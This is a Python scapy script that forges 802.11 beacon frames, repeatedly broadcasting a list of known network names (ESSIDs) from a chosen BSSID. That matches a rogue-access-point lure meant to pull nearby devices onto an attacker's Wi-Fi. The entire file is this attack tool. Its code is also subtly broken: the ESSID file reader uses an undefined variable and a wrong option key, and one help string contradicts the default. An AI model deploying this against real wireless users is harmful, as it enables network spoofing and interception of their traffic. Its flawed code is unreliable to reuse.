#!/usr/bin/env python3
import argparse

from scapy.all import *
from multiprocessing import Process

conf.verb = 3

def setup():

    parser = argparse.ArgumentParser()

    parser.add_argument('--interface', '-i',
                    dest='interface',
                    type=str,
                    required=True,
                    help='Interface for sending packets')

    parser.add_argument('--bssid', '-b',
                    dest='bssid',
                    type=str,
                    required=True,
                    help='BSSID of your access point.')

    parser.add_argument('--known-essids', 
                    dest='known_essids',
                    type=str,
                    nargs='+',
                    default=None,
                    required=False,
                    help='List of known ssids')

    parser.add_argument('--known-essids-file', 
                    dest='known_essids_file',
                    type=str,
                    default=None,
                    required=False,
                    help='File containing list of known ESSIDS of your access point.')


    parser.add_argument('--dst-addr', 
                    dest='dst_addr',
                    type=str,
                    default=None,
                    required=False,
                    help='Destination mac address (defaults to broadcast)')

    parser.add_argument('--burst-count', 
                    dest='burst_count',
                    type=int,
                    default=5,
                    required=False,
                    help='Burst count for beacon frame transmission')

    parser.add_argument('--burst-interval', 
                    dest='burst_interval',
                    type=float,
                    default=0.1,
                    required=False,
                    help='Interval between each transmission in a burst (defaults to 0.1 seconds)')

    parser.add_argument('--debug',
                    dest='debug',
                    action='store_true',
                    help='Enable debug output')

    parser.add_argument('--loop',
                    dest='loop',
                    type=int,
                    default=1,
                    required=False,
                    help='Loop through list of ESSIDs n times (default: 0)')
        
    parser.add_argument('--indefinite',
                    dest='indefinite',
                    action='store_true',
                    help='Continue looping through list of '
                         'ESSIDs until keyboard interrupt.')

    args = parser.parse_args()
    
    options = args.__dict__

    if options['known_essids'] is None and \
            options['known_essids_file'] is None:

        parser.print_usage()
        print()
        print('[!] Either the --known-essids or '
              '--known-essids-file flag must be used, '
              'but not both.')
        sys.exit()

    if options['known_essids'] is not None and \
            options['known_essids_file'] is not None:

        parser.print_usage()
        print()
        print('[!] Either the --known-essids or '
              '--known-essids-file flag must be used, '
              'but not both.')
        sys.exit()

    if options['burst_count'] <= 0:

        parser.print_usage()
        print()
        print('[!] The value specified by --burst-count '
              'must be a natural number.') 
        sys.exit()

    if options['burst_interval'] < 0:

        parser.print_usage()
        print()
        print('[!] The value specified by --burst-interval '
              'must not be less than zero.')
        sys.exit()

    if options['loop'] < 0:

        parser.print_usage()
        print()
        print('[!] The value specified by --loop '
              'must be a natural number.')
        sys.exit()

    return options

def ssid_file_reader(known_ssids_file):
    with open(ssid_file) as fd:
        for line in fd:
            ssid = line.strip()
            # skip blank lines and comments
            if not line or line[0] == '#':
                continue
            yield ssid

def create_beacon_frame(ssid, src_addr, dst_addr, debug):
    

    if dst_addr is None:
        dst_addr = 'ff:ff:ff:ff:ff:ff'

    radiotap_frame = RadioTap()
    dot11_info_frame  = Dot11(type=0, subtype=8,
                            addr1=dst_addr,
                            addr2=src_addr,
                            addr3=src_addr)
    dot11_beacon  = Dot11Beacon(cap='ESS')
    essid_frame = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
    essid_frame /= Dot11Elt(ID="Rates", info="\x0c\x12\x18\x24\x30\x48\x60\x6c")
    essid_frame /= Dot11Elt(ID="DSset", info=chr(7))

    result = radiotap_frame / dot11_info_frame / dot11_beacon / essid_frame
        
    if debug:
        result.show()

    return result

def send_beacon_burst(ssid, options):

    beacon = create_beacon_frame(ssid,
                                 options['bssid'],
                                 options['dst_addr'],
                                 options['debug'])

    print('[*] Sending burst of {} forged beacon frames for ESSID {}'.format(options['burst_count'], ssid))
    sendp(beacon,
        iface=options['interface'],
        count=options['burst_count'],
        inter=options['burst_interval'],
        verbose=1)

def beacon_burster(args):

    options = args['options']

    if options['known_essids_file'] is not None:
        known_ssids = [ssid for ssid in ssid_file_reader(options['known_ssids_file'])]
    else:
        known_ssids = options['known_essids']
    try:
        if options['indefinite']:
            while True:
                for ssid in known_ssids:
                    send_beacon_burst(ssid, options)
        else:
            for i in range(options['loop']):
                for ssid in known_ssids:
                    send_beacon_burst(ssid, options)
    except KeyboardInterrupt:
        pass
    

if __name__ == '__main__':

    options = setup()

    args = {

        'options' : options,
    }
    try:
        proc = Process(target=beacon_burster, args=(args,))
        proc.daemon = True
        proc.start()
        if options['indefinite']:
            input('Press enter at any time to quit ...')
            proc.terminate()
        proc.join()
    except KeyboardInterrupt:
        proc.terminate()
        proc.join()

